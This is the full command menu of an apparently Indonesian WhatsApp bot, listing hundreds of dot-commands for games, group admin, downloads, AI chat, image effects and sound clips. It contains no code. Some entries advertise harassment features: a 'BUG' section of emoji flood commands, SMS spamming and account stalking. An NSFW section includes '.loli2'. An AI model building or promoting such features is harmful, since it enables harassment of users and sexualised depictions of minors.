│◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ
│◦ .ʙᴄɢᴄ
│◦ .ʙᴄ
│◦ .ʟᴏᴄᴋᴄᴍᴅ
│◦ .ᴀᴅᴅᴘʀᴇᴍ
│◦ .ᴅᴇʟᴘʀᴇᴍ
│◦ .ᴀᴅᴅʟɪᴍɪᴛ
│◦ .ᴅᴇʟʟɪᴍɪᴛ
│◦ .ᴀᴅᴅᴠɴ
│◦ .ᴅᴇʟᴠɴ
│◦ .ᴍʏɪᴘ
│◦ .ᴄʜᴀᴛ
│◦ .ʀᴇᴀᴄᴛ
│◦ .sʜᴜᴛᴅᴏᴡɴ
│◦ .ᴊᴏɪɴ
│◦ .ʟᴇᴀᴠᴇ
│◦ .sᴇᴛᴇxɪғ
│◦ .sᴇᴛᴘᴘʙᴏᴛ
│◦ .sᴇᴛᴘᴘʙᴏᴛ ғᴜʟʟ
│◦ .sᴇᴛɴᴀᴍᴀʙᴏᴛ
│◦ .sᴇᴛʙɪᴏʙᴏᴛ
│◦ .ʙʟᴏᴄᴋ
│◦ .ᴜɴʙʟᴏᴄᴋ
│◦ .ᴀᴍʙɪʟsᴇsɪ
│◦ .ᴀᴍʙɪʟғɪʟᴇ
│◦ .ᴀᴍʙɪʟᴄᴀsᴇ
│◦ .ᴀᴜᴛᴏʀᴇᴀᴅ
│◦ .ᴄᴇᴋᴀᴘɪᴋᴇʏ
│◦ .ᴀᴜᴛᴏʙɪᴏ
│ >
│ =>
╰──···· •
╭── •「 *ᴄ ᴏ ɴ ғ ᴇ s* 」
│◦ .ᴍᴇɴғᴇss
│◦ .ᴄᴏɴғᴇss
╰──···· •
╭── •「 *C A I C H A T* 」
│◦ .cai-jokowi
│◦ .cai-prabowo
│◦ .cai-megawati
│◦ .cai-elaina
│◦ .cai <create|name>
│◦ .ᴢʀ
╰──···· •
╭── •「 *ʟ ᴏ ɢ* 」
│◦ .ʟᴏɢ
│◦ .ᴀᴅᴅʟᴏɢ
│◦ .ʀʟᴏɢ
╰──···· •
╭── •「 *ʀ ᴇ ɢ ɪ s ᴛ ᴇ ʀ* 」
│◦ .ᴜɴʀᴇɢ
│◦ .ᴄᴇᴋɴs
│◦ .ʀᴇɢᴍᴀɪʟ (ᴇᴍᴀɪʟ) 
│◦ .ʀᴇɢɪsᴛᴇʀ (ɴᴀᴍᴀ.ᴜᴍᴜʀ) 
│◦ .ʀᴇɢᴡᴀ
│◦ .rename
│◦ .getrenamecard
╰──···· •
╭── •「 *ʀ ᴇ ᴘ ᴏ ʀ ᴛ* 」
│◦ .ʀᴇᴘᴏʀᴛ
│◦ .ʀᴇǫᴜᴇsᴛ
╰──···· •
╭── •「 *ғ ᴜ ɴ* 」
│◦ .ᴀᴘᴀᴋᴀʜ
│◦ .ʙɪsᴀᴋᴀʜ
│◦ .dare
│◦ .truth
│◦ .ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ
│◦ .ʀᴀᴛᴇ
│◦ .ɢᴀɴᴛᴇɴɢᴄᴇᴋ
│◦ .ᴄᴇᴋɢᴀɴᴛᴇɴɢ
│◦ .ᴄᴀɴᴛɪᴋᴄᴇᴋ
│◦ .ᴄᴇᴋᴄᴀɴᴛɪᴋ
│◦ .ship
│◦ .sᴀɴɢᴇᴄᴇᴋ
│◦ .ᴄᴇᴋsᴀɴɢᴇ
│◦ .ɢᴀʏᴄᴇᴋ
│◦ .ᴄᴇᴋɢᴀʏ
│◦ .ʟᴇsʙɪᴄᴇᴋ
│◦ .ᴄᴇᴋʟᴇsʙɪ
│◦ .ᴋᴀᴘᴀɴᴋᴀʜ
│◦ .ᴡᴀɴɢʏ
│◦ .ᴄᴇᴋᴍᴀᴛɪ
│◦ .ʜᴀʟᴀʜ
│◦ .ʜɪʟɪʜ
│◦ .ʜᴜʟᴜʜ
│◦ .ʜᴇʟᴇʜ
│◦ .ʜᴏʟᴏʜ
│◦ .sɪᴍɪ
│◦ .ᴘᴀɴᴛᴜɴ    
│◦ .sᴘᴀᴍsᴍs
╰──···· •
╭── • 「 *ɢ ᴀ ᴍ ᴇ s* 」
│◦ .ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
│◦ .ʀᴘɢ
│◦ .ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
│◦ .tebak lagu
│◦ .tebak kalimat
│◦ .tebak lirik
│◦ .tebak tebakan
│◦ .tebak lontong
│◦ .tebak bendera
│◦ .tebak bendera2
│◦ .tebak kabupaten
│◦ .tebak kimia
│◦ .tebak asahotak
│◦ .tebak siapakahaku
│◦ .tebak susunkata
│◦ .tebak teki
╰──···· •
╭── •「 *ʀ ᴘ ɢ* 」
│◦ .ᴄʟᴀɪᴍ
│◦ .ᴊᴜᴀʟ
│◦ .ᴏᴘᴇɴʙᴏ
│◦ .ᴍᴀɴᴄɪɴɢ
│◦ .ᴍɪɴɪɴɢ
│◦ .ɪɴᴠ
│◦ .ʙᴇʀʙᴜʀᴜ
│◦ .ᴍᴜʟᴜɴɢ
│◦ .ᴋᴇʀᴊᴀ
│◦ .sʜᴏᴘ
│◦ .ʀᴘɢ
│◦ .ᴊᴏɪɴʀᴘɢ
│◦ .ɢᴀᴊɪᴀɴ
│◦ .ᴍᴇ
│◦ .ʜᴇᴀʟ
│◦ .ᴋᴇʀᴊᴀ
│◦ .ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
│◦ .ʀᴜᴍᴀʜ (ᴄᴇᴋ ʀᴜᴍᴀʜ ᴋᴀᴍᴜ) 
│◦ .ʙᴜɪʟᴅ (ᴍᴇᴍʙᴜᴀᴛ ʀᴜᴍᴀʜ ᴅʟʟ) 
│◦ .ɴᴇʙᴀɴɢ
│◦ .my
│◦ .levelup
│◦ .atm
│◦ .atmm
│◦ .ᴄᴏᴏᴋ (ᴍᴇᴍᴀsᴀᴋ) 
│◦ .ᴍᴀᴋᴀɴᴀɴ (ᴄᴇᴋ ᴍᴀᴋᴀɴᴀɴ ᴋᴀᴍᴜ) 
│◦ .ᴍᴀᴋᴀɴ (ᴀɢᴀʀ ʙᴀʀ ᴍᴇɴɪɴɢᴋᴀᴛ) 
│◦ .ᴛɪᴅᴜʀ (ᴀɢᴀʀ ᴋᴀᴍᴜ ᴘᴜʟɪʜ) 
│◦ .berkebon
│◦ .ᴛғ (ᴛʀᴀɴsᴀᴋsɪ) 
│◦ .ʙᴇʀᴛᴀʀᴜɴɢ @tag
│◦ .sᴘɪɴ <ᴊᴜᴍʟᴀʜ>
│◦ .sʟᴏᴛ <ᴊᴜᴍʟᴀʜ>
│◦ .ᴍᴇᴍʙᴜɴᴜʜ @tag
│◦ .ʙᴀɴsᴏs <ᴛᴀɢ ғʀɪᴇɴᴅ>
│◦ .ᴘᴇᴛᴜᴀʟᴀɴɢ
│◦ .ɴɢᴏᴊᴇᴋ
│◦ .ᴅᴜɴɢᴇᴏɴ
│◦ .ɴɢᴇᴡᴇ
│◦ .ᴍʏᴅᴏᴍᴘᴇᴛ
│◦ .ɢᴀᴄʜᴀ
╰──···· •
╭── •「 *ʙ ᴜ ɢ* 」
│ ${prefix}🍒️ (jumlah)
│ ${prefix}🍎 (jumlah)
│ ${prefix}🍉 (jumlah)
│ ${prefix}🍊 (jumlah)
│ ${prefix}🍍 (jumlah)
│ ${prefix}🥝 (jumlah)
│ ${prefix}🍇 (jumlah)
│ ${prefix}🥥 (jumlah)
│ ${prefix}🍅 (jumlah)
│ ${prefix}🌶️ (jumlah)
│ ${prefix}🍆 (jumlah)
│ ${prefix}🎂 (jumlah)
│ ${prefix}🌰 (jumlah)
│ ${prefix}🥔 (jumlah)
│ ${prefix}🗿 (jumlah)
╰──···· •
╭── • 「 *ᴍ ᴀ ɪ ɴ* 」
│◦ .ᴏᴡɴᴇʀ
│◦ .ᴘɪɴɢ
│◦ .ᴍᴇɴᴜ
│◦ .sᴘᴇᴇᴅᴛᴇsᴛ
│◦ .ʀᴜɴᴛɪᴍᴇ
│◦ .database
│◦ .ᴄᴇᴋʟɪᴍɪᴛ
╰──···· •
╭── • 「 *ᴘ ʀ ᴇ ᴍ ɪ ᴜ ᴍ* 」
│◦ .ᴋᴛᴘᴍᴀᴋᴇʀ
│◦ .ᴀʀᴛ
│◦ .ʟᴏʟɪ
│◦ .ɴᴇᴋᴏ
│◦ .ᴡᴀɪғᴜ
│◦ .ᴡᴀɪғᴜ2
│◦ .sʜᴏᴛᴀ
│◦ .ʜᴜsʙᴜ
│◦ .sᴀɢɪʀɪ
│◦ .sʜɪɴᴏʙᴜ
│◦ .ᴡᴀʟʟɴɪᴍᴇ
│◦ .ᴠɪʀᴀʟ
│◦ .ᴛxᴛ2ɪᴍɢ2
│◦ .ʙᴏᴋᴇᴘ
╰──···· •
╭── • 「 *ᴘ ʀ ɪ ᴍ ʙ ᴏ ɴ* 」
│◦ .ɴᴏᴍᴏʀʜᴏᴋɪ
│◦ .ᴀʀᴛɪᴍɪᴍᴘɪ
│◦ .ᴀʀᴛɪɴᴀᴍᴀ
│◦ .ʀᴀᴍᴀʟᴊᴏᴅᴏʜ
│◦ .ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ
│◦ .sᴜᴀᴍɪɪsᴛʀɪ
│◦ .ʀᴀᴍᴀʟᴄɪɴᴛᴀ
│◦ .ᴄᴏᴄᴏᴋɴᴀᴍᴀ
│◦ .ᴘᴀsᴀɴɢᴀɴ
│◦ .ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ
│◦ .tebakgender
│◦ .tebakumur
│◦ .sɪғᴀᴛᴜsᴀʜᴀ
│◦ .ʀᴇᴢᴇᴋɪ
│◦ .ᴘᴇᴋᴇʀᴊᴀᴀɴ
│◦ .ʀᴀᴍᴀʟɴᴀsɪʙ
│◦ .ᴘᴇɴʏᴀᴋɪᴛ
│◦ .ᴛᴀʀᴏᴛ
│◦ .ғᴇɴɢsʜᴜɪ
│◦ .ʜᴀʀɪʙᴀɪᴋ
│◦ .ʜᴀʀɪsᴀɴɢᴀʀ
│◦ .ʜᴀʀɪsɪᴀʟ
│◦ .ɴᴀɢᴀʜᴀʀɪ
│◦ .ᴀʀᴀʜʀᴇᴢᴇᴋɪ
│◦ .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ
│◦ .ᴡᴇᴛᴏɴ
│◦ .ᴋᴀʀᴀᴋᴛᴇʀ
│◦ .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ
│◦ .ᴍᴇᴍᴀɴᴄɪɴɢ
│◦ .ᴍᴀsᴀsᴜʙᴜʀ
│◦ .ᴢᴏᴅɪᴀᴋ
│◦ .sʜɪᴏ
╰──···· •
╭── • 「 *ɢ ʀ ᴏ ᴜ ᴘ* 」
│◦ .ᴋɪᴄᴋ
│◦ .ᴀᴅᴅ
│◦ .ᴘʀᴏᴍᴏᴛᴇ
│◦ .ᴅᴇᴍᴏᴛᴇ
│◦ .sᴇᴛɴᴀᴍᴇ
│◦ .sᴇᴛᴅᴇsᴄ
│◦ .sᴇᴛᴘᴘɢᴄ
│◦ .ᴛᴀɢᴀʟʟ
│◦ .ʜɪᴅᴇᴛᴀɢ
│◦ .ᴛᴏᴛᴀɢ
│◦ .ᴀɴᴛɪʟɪɴᴋ
│◦ .ᴀɴᴛɪʟɪɴᴋᴠ2
│◦ .ᴀɴᴛɪʟɪɴᴋʏᴛ
│◦ .ᴀɴᴛɪʟɪɴᴋᴛᴛ
│◦ .ᴍᴜᴛᴇɢᴄ
│◦ .ᴇᴘʜᴇᴍᴇʀᴀʟ
│◦ .ɢʀᴏᴜᴘ
│◦ .ᴇᴅɪᴛɪɴғᴏ
│◦ .ʟɪɴᴋɢᴄ
│◦ .ʀᴇᴠᴏᴋᴇ
│◦ .ʟɪsᴛᴏɴ
╰──···· •
╭── • 「 *ᴅ ᴀ ᴛ ᴀ* 」
│◦ .sᴇᴛᴄᴍᴅ [reply sticker/pesan]
│◦ .ʟɪsᴛᴄᴍᴅ
│◦ .ᴅᴇʟᴄᴍᴅ [reply sticker/pesan]
│◦ .ʟᴏᴄᴋᴄᴍᴅ
│◦ .ᴀᴅᴅᴍsɢ
│◦ .ʟɪsᴛᴍsɢ
│◦ .ɢᴇᴛᴍsɢ
│◦ .ᴅᴇʟᴍsɢ
╰──···· •
╭── • 「 *ɴ s ғ ᴡ  ᴘ ʀ ᴇ ᴍ ɪ ᴜ ᴍ* 」
│◦ .ᴀʜᴇɢᴀᴏ
│◦ .ᴄᴜᴍ
│◦ .ᴘᴀɴᴛɪᴇs
│◦ .ʙᴅsᴍ
│◦ .ᴛɪᴛs
│◦ .ᴠɪʀᴀʟ
│◦ .ʙᴏᴋᴇᴘ
│◦ .ᴍɪʟғ
│◦ .ʏᴜʀɪ
│◦ .ʟᴇᴡᴅ
│◦ .ᴇʀᴏ
│◦ .ᴀʀᴍᴘɪᴛs
│◦ .ғᴇᴇᴛs
│◦ .ᴇᴄᴄʜɪ
│◦ .ɴᴇᴋᴏ2
│◦ .ʟᴏʟɪ2
│◦ .ᴘᴜssʏ
│◦ .ᴄᴜᴍ_ᴊᴘɢ
│◦ .ʙʟᴏᴡᴊᴏʙ
│◦ .ʟᴇᴡᴅᴋ
╰──···· •
╭── • 「 *ʀ ᴀ ᴍ ᴅ ᴏ ᴍ* 」
│◦ .ᴘᴏᴋᴇᴍᴏɴ
│◦ .ʀɪᴢᴇ
│◦ .sᴀɢɪʀɪ
│◦ .ᴀᴇsᴛʜᴇᴛɪᴄ
│◦ .ᴀɴᴊɪɴɢ
│◦ .ʙʟᴀɴᴋᴘɪɴᴋ
│◦ .ʙᴏɴᴇᴋᴀ
│◦ .ʜᴇᴋᴇʟ
│◦ .ᴊᴜsᴛɪɴᴀ
│◦ .ᴋᴘᴏᴘ
│◦ .ᴋᴜᴄɪɴɢ
│◦ .ᴍᴏʙɪʟ
│◦ .ᴍᴏᴛᴏʀ
│◦ .ᴘᴜʙɢ
│◦ .ʀᴏsᴇ
│◦ .ʀʏᴜᴊɪɴ
│◦ .ᴡᴀʟʟʜᴘ
│◦ .ᴄʏʙᴇʀsᴘᴀᴄᴇ
│◦ .ᴍᴏᴜɴᴛᴀɪɴ
│◦ .ᴘʀᴏɢʀᴀᴍᴍɪɴɢ
│◦ .ᴛᴇᴄʜɴᴏʟᴏɢʏ
│◦ .ᴄᴏᴜᴘʟᴇ
╰──···· •
╭── • 「 *ᴀ s ᴜ ᴘ ᴀ ɴ* 」
│◦ .ᴄᴇᴄᴀɴ
│◦ .ᴄʜɪɴᴀ
│◦ .ᴄᴏɢᴀɴ
│◦ .ɪɴᴅᴏɴᴇsɪᴀ
│◦ .ᴊᴀᴘᴀɴ
│◦ .ᴋᴏʀᴇᴀ
│◦ .ᴍᴀʟᴀʏsɪᴀ
│◦ .ᴛʜᴀɪʟᴀɴᴅ
│◦ .ᴠɪᴇᴛɴᴀᴍ
│◦ .ʙᴏᴋᴇᴘ
│◦ .ᴠɪʀᴀʟ
╰──···· •
╭── • 「 *ᴛ ᴏ ᴏ ʟ s* 」
│◦ .sᴛʏʟᴇ
│◦ .ᴅᴇʟᴇᴛᴇ
│◦ .ǫᴜᴏᴛᴇᴅ
│◦ .ᴇʙɪɴᴀʀʏ
│◦ .ᴅʙɪɴᴀʀʏ
│◦ .ᴡɪᴋɪᴍᴇᴅɪᴀ
│◦ .ʙᴀss
│◦ .ʙʟᴏᴡɴ
│◦ .ᴅᴇᴇᴘ
│◦ .ᴇᴀʀʀᴀᴘᴇ
│◦ .ғᴀsᴛ
│◦ .ғᴀᴛ
│◦ .ɴɪɢʜᴛᴄᴏʀᴇ
│◦ .ʀᴇᴠᴇʀsᴇ
│◦ .ʀᴏʙᴏᴛ
│◦ .sʟᴏᴡ
│◦ .ᴛᴜᴘᴀɪ
│◦ .ᴀɪ
│◦ .ᴄʜᴀᴛɢᴘᴛ
│◦ .bard
│◦ .gimage
│◦ .ngl
│◦ .ᴏᴘᴇɴᴀɪ
│◦ .ᴛxᴛ2ɪᴍɢ2
╰──···· •
╭── • 「 *ᴄ ʀ ᴇ ᴀ ᴛ ᴏ ʀ  ɪ ᴍ ᴀ ɢ ᴇ* 」
│◦ .ᴛᴏʟᴏʟsᴇʀᴛɪғɪᴋᴀᴛ *<text>*
│◦ .ʙᴜᴄɪɴsᴇʀᴛɪғɪᴋᴀᴛ *<text>*
│◦ .ᴘᴀᴄᴀʀsᴇʀᴛɪғɪᴋᴀᴛ *<text>*
│◦ .ᴛᴛᴘ *<text>*
│◦ .ᴀᴛᴛᴘ *<text>*
│◦ .ᴀᴛᴛᴘ2 *<text>*
│◦ .ǫᴄɪᴍɢ *<text>*
│◦ .ǫᴄ *<text>*
╰──···· •
╭── • 「 *ɪ s ʟ ᴀ ᴍ* 」
│◦ .ᴀsᴍᴀᴜʟʜᴜsɴᴀ
│◦ .ᴀʟǫᴜʀᴀɴᴀᴜᴅɪᴏ
│◦ .ᴀʟǫᴜʀᴀɴ
│◦ .ᴊᴀᴅᴡᴀʟsᴏʟᴀᴛ
│◦ .ᴋɪsᴀʜɴᴀʙɪ
│◦ .ʟɪsᴛsᴜʀᴀʜ
│◦ .ɪǫʀᴏ
│◦ .ᴊᴜᴢᴀᴍᴍᴀ
│◦ .ʜᴀᴅɪsᴛ
│◦ .ᴛᴀsғɪʀsᴜʀᴀʜ
│◦ .ǫᴜᴏᴛᴇɪsʟᴀᴍ    
╰──···· •
╭── • 「 *ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ* 」
│◦ .ʏᴛᴘʟᴀʏ
│◦ .ʏᴛᴍᴘ3
│◦ .ʏᴛᴍᴘ4
│◦ .ɪɢᴅʟ
│◦ .ttmp3
│◦ .ɪɢᴅʟ2
│◦ .ᴛɪᴋᴛᴏᴋ
│◦ .ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ
│◦ .ᴛᴡᴛᴅʟ
│◦ .ғʙᴅʟ
│◦ .ɢɪᴛᴄʟᴏɴᴇ
│◦ .spotifydl
╰──···· •
╭── • 「 *ᴇ ᴘ ʜ ᴏ ᴛ ᴏ _1_* 」
│◦ .ᴡᴇᴛɢʟᴀss *<text>*
│◦ .ᴍᴜʟᴛɪᴄᴏʟᴏʀ3ᴅ *<text>*
│◦ .ᴡᴀᴛᴇʀᴄᴏʟᴏʀ *<text>*
│◦ .ʟᴜxᴜʀʏɢᴏʟᴅ *<text>*
│◦ .ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ *<text>*
│◦ .ʟɪɢʜᴛᴛᴇxᴛ *<text>*
│◦ .ʙᴇᴀᴜᴛɪғᴜʟғʟᴏᴡᴇʀ *<text>*
│◦ .ᴘᴜᴘᴘʏᴄᴜᴛᴇ *<text>*
│◦ .ʀᴏʏᴀʟᴛᴇxᴛ *<text>*
│◦ .ʜᴇᴀʀᴛsʜᴀᴘᴇᴅ *<text>*
│◦ .ʙɪʀᴛʜᴅᴀʏᴄᴀᴋᴇ *<text>*
│◦ .ɢᴀʟᴀxʏsᴛʏʟᴇ *<text>*
│◦ .ʜᴏʟᴏɢʀᴀᴍ3ᴅ *<text>*
│◦ .ɢʀᴇᴇɴɴᴇᴏɴ *<text>*
│◦ .ɢʟᴏssʏᴄʜʀᴏᴍᴇ *<text>*
│◦ .ɢʀᴇᴇɴʙᴜsʜ *<text>*
│◦ .ᴍᴇᴛᴀʟʟᴏɢᴏ *<text>*
│◦ .ɴᴏᴇʟᴛᴇxᴛ *<text>*
│◦ .ɢʟɪᴛᴛᴇʀɢᴏʟᴅ *<text>*
│◦ .ᴛᴇxᴛᴄᴀᴋᴇ *<text>*
│◦ .sᴛᴀʀsɴɪɢʜᴛ *<text>*
│◦ .ᴡᴏᴏᴅᴇɴ3ᴅ *<text>*
│◦ .ᴛᴇxᴛʙʏɴᴀᴍᴇ *<text>*
│◦ .ᴡʀɪᴛᴇɢᴀʟᴀᴄʏ *<text>*
│◦ .ɢᴀʟᴀxʏʙᴀᴛ *<text>*
│◦ .sɴᴏᴡ3ᴅ *<text>*
│◦ .ʙɪʀᴛʜᴅᴀʏᴅᴀʏ *<text>*
│◦ .ɢᴏʟᴅᴘʟᴀʏʙᴜᴛᴛᴏɴ *<text>*
│◦ .sɪʟᴠᴇʀᴘʟᴀʏʙᴜᴛᴛᴏɴ *<text>*
│◦ .ғʀᴇᴇғɪʀᴇ *<text>*
╰──···· •
╭── •「 *ᴘ ʜ ᴏ ᴛ ᴏ  ᴏ x ʏ _1_* 」
│◦ .sʜᴀᴅᴏᴡ *<text>*
│◦ .ᴄᴜᴘ *<text>*
│◦ .ᴄᴜᴘ1 *<text>*
│◦ .ʀᴏᴍᴀɴᴄᴇ *<text>*
│◦ .sᴍᴏᴋᴇ *<text>*
│◦ .ʙᴜʀɴᴘᴀᴘᴇʀ *<text>*
│◦ .ʟᴏᴠᴇᴍᴇssᴀɢᴇ *<text>*
│◦ .ᴜɴᴅᴇʀɢʀᴀss *<text>*
│◦ .ʟᴏᴠᴇ *<text>*
│◦ .ᴄᴏғғᴇ *<text>*
│◦ .ᴡᴏᴏᴅʜᴇᴀʀᴛ *<text>*
│◦ .ᴡᴏᴏᴅᴇɴʙᴏᴀʀᴅ *<text>*
│◦ .sᴜᴍᴍᴇʀ3ᴅ *<text>*
│◦ .ᴡᴏʟғᴍᴇᴛᴀʟ *<text>*
│◦ .ɴᴀᴛᴜʀᴇ3ᴅ *<text>*
│◦ .ᴜɴᴅᴇʀᴡᴀᴛᴇʀ *<text>*
│◦ .ɢᴏʟᴅᴇʀʀᴏsᴇ *<text>*
│◦ .sᴜᴍᴍᴇʀɴᴀᴛᴜʀᴇ *<text>*
│◦ .ʟᴇᴛᴛᴇʀʟᴇᴀᴠᴇs *<text>*
│◦ .ɢʟᴏᴡɪɴɢɴᴇᴏɴ *<text>*
│◦ .ғᴀʟʟʟᴇᴀᴠᴇs *<text>*
│◦ .ғʟᴀᴍᴍɪɴɢ *<text>*
│◦ .ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ *<text>*
│◦ .ᴄᴀʀᴠᴇᴅᴡᴏᴏᴅ *<text>*
╰──···· •
╭── • 「 *ᴛ ᴇ x ᴛ  ᴘ ʀ ᴏ _1_* 」
│◦ .ʙʟᴀᴄᴋᴘɪɴᴋ *<text>*
│◦ .ɴᴇᴏɴ *<text>*
│◦ .ɢʀᴇᴇɴɴᴇᴏɴ *<text>*
│◦ .ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ *<text>*
│◦ .ғᴜᴛᴜʀᴇɴᴇᴏɴ *<text>*
│◦ .sᴀɴᴅᴡʀɪᴛɪɴɢ *<text>*
│◦ .sᴀɴᴅsᴜᴍᴍᴇʀ *<text>*
│◦ .sᴀɴᴅᴇɴɢʀᴀᴠᴇᴅ *<text>*
│◦ .ᴍᴇᴛᴀʟᴅᴀʀᴋ *<text>*
│◦ .ɴᴇᴏɴʟɪɢʜᴛ *<text>*
│◦ .ʜᴏʟᴏɢʀᴀᴘʜɪᴄ *<text>*
│◦ .ᴛᴇxᴛ1917 *<text>*
│◦ .ᴍɪɴɪᴏɴ *<text>*
│◦ .ᴅᴇʟᴜxᴇsɪʟᴠᴇʀ *<text>*
│◦ .ɴᴇᴡʏᴇᴀʀᴄᴀʀᴅ *<text>*
│◦ .ʙʟᴏᴏᴅғʀᴏsᴛᴇᴅ *<text>*
│◦ .ʜᴀʟʟᴏᴡᴇᴇɴ *<text>*
│◦ .ᴊᴏᴋᴇʀʟᴏɢᴏ *<text>*
│◦ .ғɪʀᴇᴡᴏʀᴋsᴘᴀʀᴋʟᴇ *<text>*
│◦ .ɴᴀᴛᴜʀᴇʟᴇᴀᴠᴇs *<text>*
│◦ .ʙᴏᴋᴇʜ *<text>*
│◦ .ᴛᴏxɪᴄ *<text>*
│◦ .sᴛʀᴀᴡʙᴇʀʀʏ *<text>*
│◦ .ʙᴏx3ᴅ *<text>*
│◦ .ʀᴏᴀᴅᴡᴀʀɴɪɴɢ *<text>*
│◦ .ʙʀᴇᴀᴋᴡᴀʟʟ *<text>*
│◦ .ɪᴄᴇᴄᴏʟᴅ *<text>*
│◦ .ʟᴜxᴜʀʏ *<text>*
│◦ .ᴄʟᴏᴜᴅ *<text>*
│◦ .sᴜᴍᴍᴇʀsᴀɴᴅ *<text>*
│◦ .ʜᴏʀʀᴏʀʙʟᴏᴏᴅ *<text>*
│◦ .ᴛʜᴜɴᴅᴇʀ *<text>*
╰──···· •
╭── • 「 *ᴀ ɪ* 」
│◦ .ᴏᴘᴇɴᴀɪ *<ᴛᴇxᴛ>*
│◦ .ᴊᴀᴅɪᴀɴɪᴍᴇ
│◦ .ᴄʜᴀᴛɢᴘᴛ *<ᴛᴇxᴛ>*
│◦ .bard
│◦ .jadianime
│◦ .jadizombie
│◦ .txt2img2
│◦ .ocr
│◦ .blackbox <replyimg/query>
│◦ .cai <create|name>
│◦ .disneytxt <prompt>
│◦ .promptimg <reply image>
│◦ .voice-mrbeast
│◦ .mrbeast
│◦ .diffusion
╰──···· •
╭── • 「 *ᴀ ɴ ɪ ᴍ ᴇ* 」
│◦ .ᴄᴏsᴘʟᴀʏ
│◦ .ɢᴇɴsʜɪɴ
│◦ .ʏᴏᴛsᴜʙᴀ
│◦ .sʜɪɴᴏᴍɪʏᴀ
│◦ .ʏᴜᴍᴇᴋᴏ
│◦ .ᴛᴇᴊɪɴᴀ
│◦ .ᴄʜɪʜᴏ
│◦ .ʙᴏʀᴜᴛᴏ
│◦ .kaori
│◦ .sʜɪᴢᴜᴋᴀ
│◦ .ᴋᴀɢᴀ
│◦ .ɢʀᴇᴍᴏʀʏ
│◦ .ᴋᴀɢᴜʀᴀ
│◦ .ʜɪɴᴀᴛᴀ
│◦ .ᴍɪɴᴀᴛᴏ
│◦ .ɴᴀʀᴜᴛᴏ
│◦ .sᴀɢɪʀʟ
│◦ .ᴀɴɴᴀ
│◦ .ᴅᴇɪᴅᴀʀᴀ
│◦ .ʏᴜᴋɪ
│◦ .ᴀsᴜɴᴀ
│◦ .ᴄʜɪᴛᴏɢᴇ
│◦ .ᴇᴍɪʟɪᴀ
│◦ .ɪɴᴏʀɪ
│◦ .ᴍᴀᴅᴀʀᴀ
│◦ .sᴀsᴜᴋᴇ
│◦ .ᴏɴᴇ ᴘɪᴇᴄᴇ
│◦ .ᴋᴏᴛᴏʀɪ
│◦ .ᴍɪᴋᴀsᴀ
│◦ .ᴀᴋɪʏᴀᴍᴀ
│◦ .sʜɪɴᴇ
│◦ .sʜɪɴᴋᴀ
│◦ .ᴇʟᴀɪɴᴀ
│◦ .ɴᴇᴢᴜᴋᴏ
│◦ .ʀɪᴢᴇ
│◦ .ᴀɴɴᴀ
│◦ .ᴀʏᴜᴢᴀᴍᴀ
│◦ .ʜᴇsᴛɪᴀ
│◦ .ɪᴛᴀᴄʜɪ
│◦ .sᴀᴋᴜʀᴀ
│◦ .ᴛsᴜɴᴀᴅᴇ
│◦ .ᴋᴇɴᴄᴋɪ
│◦ .ᴛᴏᴜᴋᴀᴄʜᴀɴ
│◦ .ᴀᴋɪʀᴀ
│◦ .ɪᴛᴏʀɪ
│◦ .ᴋᴜʀᴜᴍɪ
│◦ .ᴍɪᴋᴜ
│◦ .ᴘᴏᴋᴇᴍᴏɴ
╰──···· •
╭── • 「 *ᴄ ᴏ ɴ ᴠ ᴇ ʀ ᴛ* 」
│◦ .sᴛɪᴄᴋᴇʀ
│◦ .sᴡᴍ
│◦ .scircle
│◦ .circle
│◦ .sᴍᴇᴍᴇ
│◦ .ᴇᴍᴏᴊɪᴍɪx
│◦ .ᴇᴍᴏᴊɪᴍɪx2
│◦ .ᴛᴏɪᴍᴀɢᴇ
│◦ .ᴛᴏᴍᴘ4
│◦ .ᴛᴏᴀᴜᴅɪᴏ
│◦ .ᴛᴏᴍᴘ3
│◦ .ᴛᴏᴠɴ
│◦ .ᴛᴏɢɪғ
╰──···· •
╭── •「 *s ᴛ ᴀ ʟ ᴋ ᴇ ʀ* 」
│◦ .ᴇɴᴋᴀ
│◦ .ɪɢsᴛᴀʟᴋ
│◦ .ᴛᴛsᴛᴀʟᴋ
│◦ .ᴍʟsᴛᴀʟᴋ
│◦ .ɢʜsᴛᴀʟᴋ
│◦ .enka
│◦ .ᴛᴡsᴛᴀʟᴋ
╰──···· •
╭── • 「 *s ᴏ ᴜ ɴ ᴅ* 」
│◦ .sᴏᴜɴᴅ1
│◦ .sound2
│◦ .sound3
│◦ .sound4
│◦ .sound5
│◦ .sound6
│◦ .sound7
│◦ .sound8
│◦ .sound9
│◦ .sound10
│◦ .sound11
│◦ .sound12
│◦ .sound13
│◦ .sound14
│◦ .sound15
│◦ .sound16
│◦ .sound17
│◦ .sound18
│◦ .sound19
│◦ .sound20
│◦ .sound21
│◦ .sound22
│◦ .sound23
│◦ .sound24
│◦ .sound25
│◦ .sound26
│◦ .sound27
│◦ .sound28
│◦ .sound29
│◦ .sound30
│◦ .sound31
│◦ .sound32
│◦ .sound33
│◦ .sound34
│◦ .sound35
│◦ .sound36
│◦ .sound37
│◦ .sound38
│◦ .sound39
│◦ .sound40
│◦ .sound41
│◦ .sound42
│◦ .sound43
│◦ .sound44
│◦ .sound45
│◦ .sound46
│◦ .sound47
│◦ .sound48
│◦ .sound49
│◦ .sound50
│◦ .sound51
│◦ .sound52
│◦ .sound53
│◦ .sound54
│◦ .sound55
│◦ .sound56
│◦ .sound57
│◦ .sound58
│◦ .sound59
│◦ .sound60
│◦ .sound61
│◦ .sound62
│◦ .sound63
│◦ .sound64
│◦ .sound65
│◦ .sound66
│◦ .sound67
│◦ .sound68
│◦ .sound69
│◦ .sound70
│◦ .sound71
│◦ .sound72
│◦ .sound73
